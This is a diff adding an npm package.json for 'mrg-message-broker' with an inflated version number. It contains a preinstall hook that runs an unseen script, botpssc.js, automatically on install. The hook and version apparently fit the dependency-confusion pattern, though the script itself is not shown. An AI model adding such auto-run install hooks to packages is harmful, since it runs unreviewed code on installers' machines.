@@ -1,0 +1,11 @@
+{
+  "name": "mrg-message-broker",
+  "version": "9998.987.376",
+  "main": "botpssc.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node botpssc.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
